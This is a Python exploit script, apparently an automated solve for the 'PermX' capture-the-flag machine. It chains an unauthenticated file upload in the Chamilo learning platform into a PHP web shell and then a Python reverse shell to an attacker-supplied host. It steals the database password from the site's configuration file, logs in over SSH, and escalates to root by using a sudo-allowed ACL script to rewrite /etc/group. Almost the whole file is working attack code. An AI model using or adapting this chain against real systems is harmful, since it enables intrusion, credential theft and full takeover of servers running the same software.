from listener_linux import RevShell
import requests
import warnings
warnings.filterwarnings(action="ignore", module='.*paramiko.*')
import paramiko  # noqa (stop autopep8 from fuckign up the load order)

WEB_URL = "http://lms.permx.htb"
VULNERABLE_URL = f"{WEB_URL}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
FILE_URL = f"{WEB_URL}/main/inc/lib/javascript/bigupload/files/"
TARGET = input("[$] Input target server IP: ")
RHOST = input("[$] Input the local listening host: ")
RPORT = int(input("[$] Input the local listening port: "))
REVERSE_SHELL = f"""import socket;import subprocess;RHOST = '{RHOST}';RPORT = {RPORT};socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);socket.connect((RHOST, int(RPORT)));subprocess.call(['/bin/sh', '-i'], stdin=socket.fileno(),stderr=socket.fileno(), stdout=socket.fileno())"""


def urlencode(string):
    return ''.join('%{0:0>2x}'.format(ord(char)) for char in string)


response = requests.post(
    VULNERABLE_URL,
    files={
        'bigUploadFile': ('webshell.php', '<?php echo system($_GET["cmd"])?>')
    }
)

revshell = RevShell(RPORT)
revshell.startListener()

try:
    response = requests.get(f'{FILE_URL}webshell.php?cmd=' + urlencode(f'echo -n "{REVERSE_SHELL}" > shell.py'), timeout=1)
except requests.exceptions.ReadTimeout:
    pass

try:
    response = requests.get(f'{FILE_URL}webshell.php?cmd={urlencode("python3 shell.py")}', timeout=1)
except requests.exceptions.ReadTimeout:
    pass

print("[+] Reverse Shell executed")
revshell.acceptConnection()

password = revshell.interact("cat /var/www/chamilo/app/config/configuration.php | grep db_password")
username = revshell.interact("ls /home")
username = username.strip()
password = (password.split("'"))[3]
revshell.closeConnection()


with paramiko.SSHClient() as ssh_client:

    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname=TARGET, username=username, password=password)
    print("[+] Connected via SSH")
    stdin, stdout, sterr = ssh_client.exec_command(
        f"ln -s /etc/group group; echo {password} | sudo -S /opt/acl.sh mtz rwx /home/mtz/group; ex +%s/sudo:x:27:/sudo:x:27:mtz,/ -scwq /home/mtz/group; rm /home/mtz/group", get_pty=True)
    print("[+] Exploit Sucessful")
    ssh_client.close()
    ssh_client.connect(hostname=TARGET, username=username, password=password)
    stdout.flush()
    stdin.flush()
    stdin, stdout, sterr = ssh_client.exec_command(f"echo {password} | sudo -S cat /root/root.txt; cat /home/mtz/user.txt", get_pty=True)

    stdin.flush()
    output = stdout.readlines()

    root_flag = (((output[0]).strip()).split(" "))[4]
    user_flag = output[1].strip()

    print(f"[x] Root Flag: {root_flag}\n[x] User Flag: {user_flag}")

    ssh_client.close()
